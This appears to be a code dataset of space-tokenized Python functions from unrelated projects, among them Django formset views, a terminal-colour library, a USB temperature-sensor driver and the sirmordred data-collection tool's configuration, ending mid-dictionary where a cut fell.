def construct_formset ( self ) : formset_class = self . get_formset ( ) if hasattr ( self , 'get_extra_form_kwargs' ) : klass = type ( self ) . __name__ raise DeprecationWarning ( 'Calling {0}.get_extra_form_kwargs is no longer supported. ' 'Set `form_kwargs` in {0}.formset_kwargs or override ' '{0}.get_formset_kwargs() directly.' . format ( klass ) , ) return formset_class ( * * self . get_formset_kwargs ( ) )
def get_formset_kwargs ( self ) : kwargs = self . formset_kwargs . copy ( ) kwargs . update ( { 'initial' : self . get_initial ( ) , 'prefix' : self . get_prefix ( ) , } ) if self . request . method in ( 'POST' , 'PUT' ) : kwargs . update ( { 'data' : self . request . POST . copy ( ) , 'files' : self . request . FILES , } ) return kwargs
def get_factory_kwargs ( self ) : # Perform deprecation check for attr in [ 'extra' , 'max_num' , 'can_order' , 'can_delete' , 'ct_field' , 'formfield_callback' , 'fk_name' , 'widgets' , 'ct_fk_field' ] : if hasattr ( self , attr ) : klass = type ( self ) . __name__ raise DeprecationWarning ( 'Setting `{0}.{1}` at the class level is now deprecated. ' 'Set `{0}.factory_kwargs` instead.' . format ( klass , attr ) ) kwargs = self . factory_kwargs . copy ( ) if self . get_formset_class ( ) : kwargs [ 'formset' ] = self . get_formset_class ( ) return kwargs
def get_success_url ( self ) : if self . success_url : url = self . success_url else : # Default to returning to the same page url = self . request . get_full_path ( ) return url
def get_formset_kwargs ( self ) : kwargs = super ( ModelFormSetMixin , self ) . get_formset_kwargs ( ) kwargs [ 'queryset' ] = self . get_queryset ( ) return kwargs
def formset_valid ( self , formset ) : self . object_list = formset . save ( ) return super ( ModelFormSetMixin , self ) . formset_valid ( formset )
def get_formset_kwargs ( self ) : # Perform deprecation check if hasattr ( self , 'save_as_new' ) : klass = type ( self ) . __name__ raise DeprecationWarning ( 'Setting `{0}.save_as_new` at the class level is now ' 'deprecated. Set `{0}.formset_kwargs` instead.' . format ( klass ) ) kwargs = super ( BaseInlineFormSetFactory , self ) . get_formset_kwargs ( ) kwargs [ 'instance' ] = self . object return kwargs
def get_factory_kwargs ( self ) : kwargs = super ( BaseInlineFormSetFactory , self ) . get_factory_kwargs ( ) kwargs . setdefault ( 'fields' , self . fields ) kwargs . setdefault ( 'exclude' , self . exclude ) if self . get_form_class ( ) : kwargs [ 'form' ] = self . get_form_class ( ) return kwargs
def get ( self , request , * args , * * kwargs ) : formset = self . construct_formset ( ) return self . render_to_response ( self . get_context_data ( formset = formset ) )
def forms_valid ( self , form , inlines ) : response = self . form_valid ( form ) for formset in inlines : formset . save ( ) return response
def construct_inlines ( self ) : inline_formsets = [ ] for inline_class in self . get_inlines ( ) : inline_instance = inline_class ( self . model , self . request , self . object , self . kwargs , self ) inline_formset = inline_instance . construct_formset ( ) inline_formsets . append ( inline_formset ) return inline_formsets
def get ( self , request , * args , * * kwargs ) : form_class = self . get_form_class ( ) form = self . get_form ( form_class ) inlines = self . construct_inlines ( ) return self . render_to_response ( self . get_context_data ( form = form , inlines = inlines , * * kwargs ) )
def get_params_for_field ( self , field_name , sort_type = None ) : if not sort_type : if self . initial_sort == field_name : sort_type = 'desc' if self . initial_sort_type == 'asc' else 'asc' else : sort_type = 'asc' self . initial_params [ self . sort_param_name ] = self . sort_fields [ field_name ] self . initial_params [ self . sort_type_param_name ] = sort_type return '?%s' % self . initial_params . urlencode ( )
def get_start_date ( self , obj ) : obj_date = getattr ( obj , self . get_date_field ( ) ) try : obj_date = obj_date . date ( ) except AttributeError : # It's a date rather than datetime, so we use it as is pass return obj_date
def get_end_date ( self , obj ) : obj_date = getattr ( obj , self . get_end_date_field ( ) ) try : obj_date = obj_date . date ( ) except AttributeError : # It's a date rather than datetime, so we use it as is pass return obj_date
def get_queryset ( self ) : qs = super ( BaseCalendarMonthView , self ) . get_queryset ( ) year = self . get_year ( ) month = self . get_month ( ) date_field = self . get_date_field ( ) end_date_field = self . get_end_date_field ( ) date = _date_from_string ( year , self . get_year_format ( ) , month , self . get_month_format ( ) ) since = date until = self . get_next_month ( date ) # Adjust our start and end dates to allow for next and previous # month edges if since . weekday ( ) != self . get_first_of_week ( ) : diff = math . fabs ( since . weekday ( ) - self . get_first_of_week ( ) ) since = since - datetime . timedelta ( days = diff ) if until . weekday ( ) != ( ( self . get_first_of_week ( ) + 6 ) % 7 ) : diff = math . fabs ( ( ( self . get_first_of_week ( ) + 6 ) % 7 ) - until . weekday ( ) ) until = until + datetime . timedelta ( days = diff ) if end_date_field : # 5 possible conditions for showing an event: # 1) Single day event, starts after 'since' # 2) Multi-day event, starts after 'since' and ends before 'until' # 3) Starts before 'since' and ends after 'since' and before 'until' # 4) Starts after 'since' but before 'until' and ends after 'until' # 5) Starts before 'since' and ends after 'until' predicate1 = Q ( * * { '%s__gte' % date_field : since , end_date_field : None } ) predicate2 = Q ( * * { '%s__gte' % date_field : since , '%s__lt' % end_date_field : until } ) predicate3 = Q ( * * { '%s__lt' % date_field : since , '%s__gte' % end_date_field : since , '%s__lt' % end_date_field : until } ) predicate4 = Q ( * * { '%s__gte' % date_field : since , '%s__lt' % date_field : until , '%s__gte' % end_date_field : until } ) predicate5 = Q ( * * { '%s__lt' % date_field : since , '%s__gte' % end_date_field : until } ) return qs . filter ( predicate1 | predicate2 | predicate3 | predicate4 | predicate5 ) return qs . filter ( * * { '%s__gte' % date_field : since } )
def read_version ( ) : finder = VersionFinder ( ) path = os . path . join ( PROJECT_ROOT , 'colorful' , '__init__.py' ) with codecs . open ( path , 'r' , encoding = 'utf-8' ) as fp : file_data = fp . read ( ) . encode ( 'utf-8' ) finder . visit ( ast . parse ( file_data ) ) return finder . version
def with_setup ( self , colormode = None , colorpalette = None , extend_colors = False ) : colorful = Colorful ( colormode = self . colorful . colormode , colorpalette = copy . copy ( self . colorful . colorpalette ) ) colorful . setup ( colormode = colormode , colorpalette = colorpalette , extend_colors = extend_colors ) yield colorful
def show ( ) : # modifiers sys . stdout . write ( colorful . bold ( 'bold' ) + ' ' ) sys . stdout . write ( colorful . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( colorful . italic ( 'italic' ) + ' ' ) sys . stdout . write ( colorful . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( colorful . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( colorful . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( colorful . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( colorful . red ( 'red' ) + ' ' ) sys . stdout . write ( colorful . green ( 'green' ) + ' ' ) sys . stdout . write ( colorful . yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( colorful . blue ( 'blue' ) + ' ' ) sys . stdout . write ( colorful . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( colorful . cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( colorful . white ( 'white' ) + '\n' ) # background colors sys . stdout . write ( colorful . on_red ( 'red' ) + ' ' ) sys . stdout . write ( colorful . on_green ( 'green' ) + ' ' ) sys . stdout . write ( colorful . on_yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( colorful . on_blue ( 'blue' ) + ' ' ) sys . stdout . write ( colorful . on_magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( colorful . on_cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( colorful . on_white ( 'white' ) + '\n' )
def show ( ) : with colorful . with_style ( 'monokai' ) as c : # modifiers sys . stdout . write ( c . bold ( 'bold' ) + ' ' ) sys . stdout . write ( c . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( c . italic ( 'italic' ) + ' ' ) sys . stdout . write ( c . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( c . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( c . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( c . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( c . orange ( 'orange' ) + ' ' ) sys . stdout . write ( c . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . purple ( 'purple' ) + ' ' ) sys . stdout . write ( c . blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . seaGreen ( 'sea green' ) + ' ' ) sys . stdout . write ( c . green ( 'green' ) + ' ' ) sys . stdout . write ( c . yellow ( 'yellow' ) + '\n' ) # background colors sys . stdout . write ( c . on_orange ( 'orange' ) + ' ' ) sys . stdout . write ( c . on_magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . on_purple ( 'purple' ) + ' ' ) sys . stdout . write ( c . on_blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . on_seaGreen ( 'sea green' ) + ' ' ) sys . stdout . write ( c . gray_on_green ( 'green' ) + ' ' ) sys . stdout . write ( c . gray_on_yellow ( 'yellow' ) + '\n' )
def rgb_to_ansi256 ( r , g , b ) : if r == g and g == b : if r < 8 : return 16 if r > 248 : return 231 return round ( ( ( r - 8 ) / 247.0 ) * 24 ) + 232 ansi_r = 36 * round ( r / 255.0 * 5.0 ) ansi_g = 6 * round ( g / 255.0 * 5.0 ) ansi_b = round ( b / 255.0 * 5.0 ) ansi = 16 + ansi_r + ansi_g + ansi_b return ansi
def rgb_to_ansi16 ( r , g , b , use_bright = False ) : ansi_b = round ( b / 255.0 ) << 2 ansi_g = round ( g / 255.0 ) << 1 ansi_r = round ( r / 255.0 ) ansi = ( 90 if use_bright else 30 ) + ( ansi_b | ansi_g | ansi_r ) return ansi
def show ( ) : with colorful . with_style ( 'solarized' ) as c : # modifiers sys . stdout . write ( c . bold ( 'bold' ) + ' ' ) sys . stdout . write ( c . dimmed ( 'dimmed' ) + ' ' ) sys . stdout . write ( c . italic ( 'italic' ) + ' ' ) sys . stdout . write ( c . underlined ( 'underlined' ) + ' ' ) sys . stdout . write ( c . inversed ( 'inversed' ) + ' ' ) sys . stdout . write ( c . concealed ( 'concealed' ) + ' ' ) sys . stdout . write ( c . struckthrough ( 'struckthrough' ) + '\n' ) # foreground colors sys . stdout . write ( c . yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( c . red ( 'orange' ) + ' ' ) sys . stdout . write ( c . red ( 'red' ) + ' ' ) sys . stdout . write ( c . magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . magenta ( 'violet' ) + ' ' ) sys . stdout . write ( c . blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( c . green ( 'green' ) + '\n' ) # background colors sys . stdout . write ( c . on_yellow ( 'yellow' ) + ' ' ) sys . stdout . write ( c . on_red ( 'orange' ) + ' ' ) sys . stdout . write ( c . on_red ( 'red' ) + ' ' ) sys . stdout . write ( c . on_magenta ( 'magenta' ) + ' ' ) sys . stdout . write ( c . on_magenta ( 'violet' ) + ' ' ) sys . stdout . write ( c . on_blue ( 'blue' ) + ' ' ) sys . stdout . write ( c . on_cyan ( 'cyan' ) + ' ' ) sys . stdout . write ( c . on_green ( 'green' ) + '\n' )
def colorpalette ( self , colorpalette ) : if isinstance ( colorpalette , str ) : # we assume it's a path to a color file colorpalette = colors . parse_colors ( colorpalette ) self . _colorpalette = colors . sanitize_color_palette ( colorpalette )
def readattr ( path , name ) : try : f = open ( USB_SYS_PREFIX + path + "/" + name ) return f . readline ( ) . rstrip ( "\n" ) except IOError : return None
def get_data ( self , reset_device = False ) : try : if reset_device : self . _device . reset ( ) # detach kernel driver from both interfaces if attached, so we can set_configuration() for interface in [ 0 , 1 ] : if self . _device . is_kernel_driver_active ( interface ) : LOGGER . debug ( 'Detaching kernel driver for interface %d ' 'of %r on ports %r' , interface , self . _device , self . _ports ) self . _device . detach_kernel_driver ( interface ) self . _device . set_configuration ( ) # Prevent kernel message: # "usbfs: process <PID> (python) did not claim interface x before use" # This will become unnecessary once pull-request #124 for # PyUSB has been accepted and we depend on a fixed release # of PyUSB.  Until then, and even with the fix applied, it # does not hurt to explicitly claim the interface. usb . util . claim_interface ( self . _device , INTERFACE ) # Turns out we don't actually need that ctrl_transfer. # Disabling this reduces number of USBErrors from ~7/30 to 0! #self._device.ctrl_transfer(bmRequestType=0x21, bRequest=0x09, #    wValue=0x0201, wIndex=0x00, data_or_wLength='\x01\x01', #    timeout=TIMEOUT) # Magic: Our TEMPerV1.4 likes to be asked twice.  When # only asked once, it get's stuck on the next access and # requires a reset. self . _control_transfer ( COMMANDS [ 'temp' ] ) self . _interrupt_read ( ) # Turns out a whole lot of that magic seems unnecessary. #self._control_transfer(COMMANDS['ini1']) #self._interrupt_read() #self._control_transfer(COMMANDS['ini2']) #self._interrupt_read() #self._interrupt_read() # Get temperature self . _control_transfer ( COMMANDS [ 'temp' ] ) temp_data = self . _interrupt_read ( ) # Get humidity if self . _device . product == 'TEMPer1F_H1_V1.4' : humidity_data = temp_data else : humidity_data = None # Combine temperature and humidity data data = { 'temp_data' : temp_data , 'humidity_data' : humidity_data } # Be a nice citizen and undo potential interface claiming. usb . util . dispose_resources ( self . _device ) return data except usb . USBError as err : if not reset_device : LOGGER . warning ( "Encountered %s, resetting %r and trying again." , err , self . _device ) return self . get_data ( True ) # Catch the permissions exception and add our message if "not permitted" in str ( err ) : raise Exception ( "Permission problem accessing USB. " "Maybe I need to run as root?" ) else : LOGGER . error ( err ) raise
def get_temperature ( self , format = 'celsius' , sensor = 0 ) : results = self . get_temperatures ( sensors = [ sensor , ] ) if format == 'celsius' : return results [ sensor ] [ 'temperature_c' ] elif format == 'fahrenheit' : return results [ sensor ] [ 'temperature_f' ] elif format == 'millicelsius' : return results [ sensor ] [ 'temperature_mc' ] else : raise ValueError ( "Unknown format" )
def _interrupt_read ( self ) : data = self . _device . read ( ENDPOINT , REQ_INT_LEN , timeout = TIMEOUT ) LOGGER . debug ( 'Read data: %r' , data ) return data
def measure_memory ( cls , obj , seen = None ) : size = sys . getsizeof ( obj ) if seen is None : seen = set ( ) obj_id = id ( obj ) if obj_id in seen : return 0 # Important mark as seen *before* entering recursion to gracefully handle # self-referential objects seen . add ( obj_id ) if isinstance ( obj , dict ) : size += sum ( [ cls . measure_memory ( v , seen ) for v in obj . values ( ) ] ) size += sum ( [ cls . measure_memory ( k , seen ) for k in obj . keys ( ) ] ) elif hasattr ( obj , '__dict__' ) : size += cls . measure_memory ( obj . __dict__ , seen ) elif hasattr ( obj , '__iter__' ) and not isinstance ( obj , ( str , bytes , bytearray ) ) : size += sum ( [ cls . measure_memory ( i , seen ) for i in obj ] ) return size
def __feed_arthur ( self ) : with self . ARTHUR_FEED_LOCK : # This is a expensive operation so don't do it always if ( time . time ( ) - self . ARTHUR_LAST_MEMORY_CHECK ) > 5 * self . ARTHUR_LAST_MEMORY_CHECK_TIME : self . ARTHUR_LAST_MEMORY_CHECK = time . time ( ) logger . debug ( "Measuring the memory used by the raw items dict ..." ) try : memory_size = self . measure_memory ( self . arthur_items ) / ( 1024 * 1024 ) except RuntimeError as ex : # During memory usage measure, other thread could change the dict logger . warning ( "Can't get the memory used by the raw items dict: %s" , ex ) memory_size = self . ARTHUR_LAST_MEMORY_SIZE self . ARTHUR_LAST_MEMORY_CHECK_TIME = time . time ( ) - self . ARTHUR_LAST_MEMORY_CHECK logger . debug ( "Arthur items memory size: %0.2f MB (%is to check)" , memory_size , self . ARTHUR_LAST_MEMORY_CHECK_TIME ) self . ARTHUR_LAST_MEMORY_SIZE = memory_size # Don't feed items from redis if the current python dict is # larger than ARTHUR_MAX_MEMORY_SIZE if self . ARTHUR_LAST_MEMORY_SIZE > self . ARTHUR_MAX_MEMORY_SIZE : logger . debug ( "Items queue full. Not collecting items from redis queue." ) return logger . info ( "Collecting items from redis queue" ) db_url = self . config . get_conf ( ) [ 'es_collection' ] [ 'redis_url' ] conn = redis . StrictRedis . from_url ( db_url ) logger . debug ( "Redis connection stablished with %s." , db_url ) # Get and remove queued items in an atomic transaction pipe = conn . pipeline ( ) # pipe.lrange(Q_STORAGE_ITEMS, 0, -1) pipe . lrange ( Q_STORAGE_ITEMS , 0 , self . ARTHUR_REDIS_ITEMS - 1 ) pipe . ltrim ( Q_STORAGE_ITEMS , self . ARTHUR_REDIS_ITEMS , - 1 ) items = pipe . execute ( ) [ 0 ] for item in items : arthur_item = pickle . loads ( item ) if arthur_item [ 'tag' ] not in self . arthur_items : self . arthur_items [ arthur_item [ 'tag' ] ] = [ ] self . arthur_items [ arthur_item [ 'tag' ] ] . append ( arthur_item ) for tag in self . arthur_items : if self . arthur_items [ tag ] : logger . debug ( "Arthur items for %s: %i" , tag , len ( self . arthur_items [ tag ] ) )
def __feed_backend_arthur ( self , repo ) : # Always get pending items from arthur for all data sources self . __feed_arthur ( ) tag = self . backend_tag ( repo ) logger . debug ( "Arthur items available for %s" , self . arthur_items . keys ( ) ) logger . debug ( "Getting arthur items for %s." , tag ) if tag in self . arthur_items : logger . debug ( "Found items for %s." , tag ) while self . arthur_items [ tag ] : yield self . arthur_items [ tag ] . pop ( )
def sha_github_file ( cls , config , repo_file , repository_api , repository_branch ) : repo_file_sha = None cfg = config . get_conf ( ) github_token = cfg [ 'sortinghat' ] [ 'identities_api_token' ] headers = { "Authorization" : "token " + github_token } url_dir = repository_api + "/git/trees/" + repository_branch logger . debug ( "Gettting sha data from tree: %s" , url_dir ) raw_repo_file_info = requests . get ( url_dir , headers = headers ) raw_repo_file_info . raise_for_status ( ) for rfile in raw_repo_file_info . json ( ) [ 'tree' ] : if rfile [ 'path' ] == repo_file : logger . debug ( "SHA found: %s, " , rfile [ "sha" ] ) repo_file_sha = rfile [ "sha" ] break return repo_file_sha
def __get_uuids_from_profile_name ( self , profile_name ) : uuids = [ ] with self . db . connect ( ) as session : query = session . query ( Profile ) . filter ( Profile . name == profile_name ) profiles = query . all ( ) if profiles : for p in profiles : uuids . append ( p . uuid ) return uuids
def config_logging ( debug ) : if debug : logging . basicConfig ( level = logging . DEBUG , format = '%(asctime)s %(message)s' ) logging . debug ( "Debug mode activated" ) else : logging . basicConfig ( level = logging . INFO , format = '%(asctime)s %(message)s' )
def get_params_parser ( ) : parser = argparse . ArgumentParser ( add_help = False ) parser . add_argument ( '-g' , '--debug' , dest = 'debug' , action = 'store_true' , help = argparse . SUPPRESS ) parser . add_argument ( "--arthur" , action = 'store_true' , dest = 'arthur' , help = "Enable arthur to collect raw data" ) parser . add_argument ( "--raw" , action = 'store_true' , dest = 'raw' , help = "Activate raw task" ) parser . add_argument ( "--enrich" , action = 'store_true' , dest = 'enrich' , help = "Activate enrich task" ) parser . add_argument ( "--identities" , action = 'store_true' , dest = 'identities' , help = "Activate merge identities task" ) parser . add_argument ( "--panels" , action = 'store_true' , dest = 'panels' , help = "Activate panels task" ) parser . add_argument ( "--cfg" , dest = 'cfg_path' , help = "Configuration file path" ) parser . add_argument ( "--backends" , dest = 'backend_sections' , default = [ ] , nargs = '*' , help = "Backend sections to execute" ) if len ( sys . argv ) == 1 : parser . print_help ( ) sys . exit ( 1 ) return parser
def get_params ( ) : parser = get_params_parser ( ) args = parser . parse_args ( ) if not args . raw and not args . enrich and not args . identities and not args . panels : print ( "No tasks enabled" ) sys . exit ( 1 ) return args
def __get_menu_entries ( self , kibiter_major ) : menu_entries = [ ] for entry in self . panels_menu : if entry [ 'source' ] not in self . data_sources : continue parent_menu_item = { 'name' : entry [ 'name' ] , 'title' : entry [ 'name' ] , 'description' : "" , 'type' : "menu" , 'dashboards' : [ ] } for subentry in entry [ 'menu' ] : try : dash_name = get_dashboard_name ( subentry [ 'panel' ] ) except FileNotFoundError : logging . error ( "Can't open dashboard file %s" , subentry [ 'panel' ] ) continue # The name for the entry is in self.panels_menu child_item = { "name" : subentry [ 'name' ] , "title" : subentry [ 'name' ] , "description" : "" , "type" : "entry" , "panel_id" : dash_name } parent_menu_item [ 'dashboards' ] . append ( child_item ) menu_entries . append ( parent_menu_item ) return menu_entries
def __get_dash_menu ( self , kibiter_major ) : # omenu = OrderedDict() omenu = [ ] # Start with Overview omenu . append ( self . menu_panels_common [ 'Overview' ] ) # Now the data _getsources ds_menu = self . __get_menu_entries ( kibiter_major ) # Remove the kafka and community menus, they will be included at the end kafka_menu = None community_menu = None found_kafka = [ pos for pos , menu in enumerate ( ds_menu ) if menu [ 'name' ] == KAFKA_NAME ] if found_kafka : kafka_menu = ds_menu . pop ( found_kafka [ 0 ] ) found_community = [ pos for pos , menu in enumerate ( ds_menu ) if menu [ 'name' ] == COMMUNITY_NAME ] if found_community : community_menu = ds_menu . pop ( found_community [ 0 ] ) ds_menu . sort ( key = operator . itemgetter ( 'name' ) ) omenu += ds_menu # If kafka and community are present add them before the Data Status and About if kafka_menu : omenu . append ( kafka_menu ) if community_menu : omenu . append ( community_menu ) # At the end Data Status, About omenu . append ( self . menu_panels_common [ 'Data Status' ] ) omenu . append ( self . menu_panels_common [ 'About' ] ) logger . debug ( "Menu for panels: %s" , json . dumps ( ds_menu , indent = 4 ) ) return omenu
def __autorefresh_studies ( self , cfg ) : if 'studies' not in self . conf [ self . backend_section ] or 'enrich_areas_of_code:git' not in self . conf [ self . backend_section ] [ 'studies' ] : logger . debug ( "Not doing autorefresh for studies, Areas of Code study is not active." ) return aoc_index = self . conf [ 'enrich_areas_of_code:git' ] . get ( 'out_index' , GitEnrich . GIT_AOC_ENRICHED ) # if `out_index` exists but has no value, use default if not aoc_index : aoc_index = GitEnrich . GIT_AOC_ENRICHED logger . debug ( "Autorefresh for Areas of Code study index: %s" , aoc_index ) es = Elasticsearch ( [ self . conf [ 'es_enrichment' ] [ 'url' ] ] , timeout = 100 , verify_certs = self . _get_enrich_backend ( ) . elastic . requests . verify ) if not es . indices . exists ( index = aoc_index ) : logger . debug ( "Not doing autorefresh, index doesn't exist for Areas of Code study" ) return logger . debug ( "Doing autorefresh for Areas of Code study" ) # Create a GitEnrich backend tweaked to work with AOC index aoc_backend = GitEnrich ( self . db_sh , None , cfg [ 'projects' ] [ 'projects_file' ] , self . db_user , self . db_password , self . db_host ) aoc_backend . mapping = None aoc_backend . roles = [ 'author' ] elastic_enrich = get_elastic ( self . conf [ 'es_enrichment' ] [ 'url' ] , aoc_index , clean = False , backend = aoc_backend ) aoc_backend . set_elastic ( elastic_enrich ) self . __autorefresh ( aoc_backend , studies = True )
def __studies ( self , retention_time ) : cfg = self . config . get_conf ( ) if 'studies' not in cfg [ self . backend_section ] or not cfg [ self . backend_section ] [ 'studies' ] : logger . debug ( 'No studies for %s' % self . backend_section ) return studies = [ study for study in cfg [ self . backend_section ] [ 'studies' ] if study . strip ( ) != "" ] if not studies : logger . debug ( 'No studies for %s' % self . backend_section ) return logger . debug ( "Executing studies for %s: %s" % ( self . backend_section , studies ) ) time . sleep ( 2 ) # Wait so enrichment has finished in ES enrich_backend = self . _get_enrich_backend ( ) ocean_backend = self . _get_ocean_backend ( enrich_backend ) active_studies = [ ] all_studies = enrich_backend . studies all_studies_names = [ study . __name__ for study in enrich_backend . studies ] # Time to check that configured studies are valid logger . debug ( "All studies in %s: %s" , self . backend_section , all_studies_names ) logger . debug ( "Configured studies %s" , studies ) cfg_studies_types = [ study . split ( ":" ) [ 0 ] for study in studies ] if not set ( cfg_studies_types ) . issubset ( set ( all_studies_names ) ) : logger . error ( 'Wrong studies names for %s: %s' , self . backend_section , studies ) raise RuntimeError ( 'Wrong studies names ' , self . backend_section , studies ) for study in enrich_backend . studies : if study . __name__ in cfg_studies_types : active_studies . append ( study ) enrich_backend . studies = active_studies print ( "Executing for %s the studies %s" % ( self . backend_section , [ study for study in studies ] ) ) studies_args = self . __load_studies ( ) do_studies ( ocean_backend , enrich_backend , studies_args , retention_time = retention_time ) # Return studies to its original value enrich_backend . studies = all_studies
def get_repos_by_backend_section ( cls , backend_section , raw = True ) : repos = [ ] projects = TaskProjects . get_projects ( ) for pro in projects : if backend_section in projects [ pro ] : # if the projects.json doesn't contain the `unknown` project, add the repos in the bck section if cls . GLOBAL_PROJECT not in projects : repos += projects [ pro ] [ backend_section ] else : # if the projects.json contains the `unknown` project # in the case of the collection phase if raw : # if the current project is not `unknown` if pro != cls . GLOBAL_PROJECT : # if the bck section is not in the `unknown` project, add the repos in the bck section if backend_section not in projects [ cls . GLOBAL_PROJECT ] : repos += projects [ pro ] [ backend_section ] # if the backend section is in the `unknown` project, # add the repo in the bck section under `unknown` elif backend_section in projects [ pro ] and backend_section in projects [ cls . GLOBAL_PROJECT ] : repos += projects [ cls . GLOBAL_PROJECT ] [ backend_section ] # if the current project is `unknown` else : # if the backend section is only in the `unknown` project, # add the repo in the bck section under `unknown` not_in_unknown = [ projects [ pro ] for pro in projects if pro != cls . GLOBAL_PROJECT ] [ 0 ] if backend_section not in not_in_unknown : repos += projects [ cls . GLOBAL_PROJECT ] [ backend_section ] # in the case of the enrichment phase else : # if the current project is not `unknown` if pro != cls . GLOBAL_PROJECT : # if the bck section is not in the `unknown` project, add the repos in the bck section if backend_section not in projects [ cls . GLOBAL_PROJECT ] : repos += projects [ pro ] [ backend_section ] # if the backend section is in the `unknown` project, add the repos in the bck section elif backend_section in projects [ pro ] and backend_section in projects [ cls . GLOBAL_PROJECT ] : repos += projects [ pro ] [ backend_section ] # if the current project is `unknown` else : # if the backend section is only in the `unknown` project, # add the repo in the bck section under `unknown` not_in_unknown_prj = [ projects [ prj ] for prj in projects if prj != cls . GLOBAL_PROJECT ] not_in_unknown_sections = list ( set ( [ section for prj in not_in_unknown_prj for section in list ( prj . keys ( ) ) ] ) ) if backend_section not in not_in_unknown_sections : repos += projects [ pro ] [ backend_section ] logger . debug ( "List of repos for %s: %s (raw=%s)" , backend_section , repos , raw ) # avoid duplicated repos repos = list ( set ( repos ) ) return repos
def convert_from_eclipse ( self , eclipse_projects ) : projects = { } # We need the global project for downloading the full Bugzilla and Gerrit projects [ 'unknown' ] = { "gerrit" : [ "git.eclipse.org" ] , "bugzilla" : [ "https://bugs.eclipse.org/bugs/" ] } projects = compose_title ( projects , eclipse_projects ) projects = compose_projects_json ( projects , eclipse_projects ) return projects
def general_params ( cls ) : params = { } # GENERAL CONFIG params_general = { "general" : { "min_update_delay" : { "optional" : True , "default" : 60 , "type" : int , "description" : "Short delay between tasks (collect, enrich ...)" } , "update" : { "optional" : False , "default" : False , "type" : bool , "description" : "Execute the tasks in loop" } , "short_name" : { "optional" : False , "default" : "Short name" , "type" : str , "description" : "Short name of the project" } , "debug" : { "optional" : False , "default" : True , "type" : bool , "description" : "Debug mode (logging mainly)" } , "logs_dir" : { "optional" : False , "default" : "logs" , "type" : str , "description" : "Directory with the logs of sirmordred" } , "log_handler" : { "optional" : True , "default" : "file" , "type" : str , "description" : "use rotate for rotating the logs automatically" } , "log_max_bytes" : { "optional" : True , "default" : 104857600 , # 100MB "type" : int , "description" : "Max number of bytes per log file" } , "log_backup_count" : { "optional" : True , "default" : 5 , "type" : int , "description" : "Number of rotate logs files to preserve" } , "bulk_size" : { "optional" : True , "default" : 1000 , "type" : int , "description" : "Number of items to write in Elasticsearch using bulk operations" } , "scroll_size" : { "optional" : True , "default" : 100 , "type" : int , "description" : "Number of items to read from Elasticsearch when scrolling" } , "aliases_file" : { "optional" : True , "default" : ALIASES_JSON , "type" : str , "description" : "JSON file to define aliases for raw and enriched indexes" } , "menu_file" : { "optional" : True , "default" : MENU_YAML , "type" : str , "description" : "YAML file to define the menus to be shown in Kibiter" } , "retention_time" : { "optional" : True , "default" : None , "type" : int , "description" : "The maximum number of minutes wrt the current date to retain the data" } } } params_projects = { "projects" : { "projects_file" : { "optional" : True , "default" : PROJECTS_JSON , "type" : str , "description" : "Projects file path with repositories to be collected group by projects" } , "projects_url" : { "optional" : True , "default" : None , "type" : str , "description" : "Projects file URL" } , "load_eclipse" : { "optional" : True , "default" : False , "type" : bool , "description" : "Load the projects from Eclipse" } } } params_phases = { "phases" : { "collection" : { "optional" : False , "default" : True , "type" : bool , "description" : "Activate collection of items" } , "enrichment" : { "optional" : False , "default" : True , "type" : bool , "description" : "Activate enrichment of items" } , "identities" : { "optional" : False , "default" : True , "type" : bool , "description" : "Do the identities tasks" } , "panels" : { "optional" : False , "default" : True , "type" : bool , "description" : "Load panels, create alias and other tasks related" } , "track_items" : { "optional" : True , "default" : False , "type" : bool , "description" : "Track specific items from a gerrit repository" } , "report" : { "optional" : True , "default" : False , "type" : bool , "description" : "Generate the PDF report for a project (alpha)" } } } general_config_params = [ params_general , params_projects , params_phases ] for section_params in general_config_params : params . update ( section_params ) # Config provided by tasks params_collection = { "es_collection" : { "password" : { "optional" : True , "default" : None , "type" : str , "description" : "Password for connection to Elasticsearch" } , "user" : { "optional" : True , "default" : None , "type" : str , "description" : "User for connection to Elasticsearch" } , "url" : { "optional" : False , "default" : "http://172.17.0.1:9200" , "type" : str , "description" : "Elasticsearch URL" } , "arthur" : { "optional" : True , "default" : False , "type" : bool , "description" : "Use arthur for collecting items from perceval" } , "arthur_url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL for the arthur service" } , "redis_url" : { "optional" : True , "default" : None , "type" : str , "description" : "URL for the redis service" } } } params_enrichment = { "es_enrichment" : { "url" : { "optional" : False , "default" : "http://172.17.0.1:9200" , "type" : str , "description" : "Elasticsearch URL" } , "autorefresh" : { "optional" : True , "default" : True , "type" : bool , "description" : "Execute the autorefresh of identities" } , "autorefresh_interval" : { "optional" : True , "default" : 2 , "type" : int , "description" : "Set time interval (days) for autorefresh identities" } , "user" : { "optional" : True , "default" : None , "type" : str , "description" : "User for connection to Elasticsearch" } , "password" : { "optional" : True , "default" : None , "type" : str , "description" : "Password for connection to Elasticsearch" } } } params_panels = { "panels" : { "strict" : { "optional" : True , "default" : True , "type" : bool , "description" : "Enable strict panels loading" } , "kibiter_time_from" : { "optional" : True , "default" : "now-90d" , "type" : str , "description" : "Default time interval for Kibiter" } , "kibiter_default_index" : { "optional" : True , "default" : "git" , "type" : str , "description" : "Default index pattern for Kibiter" 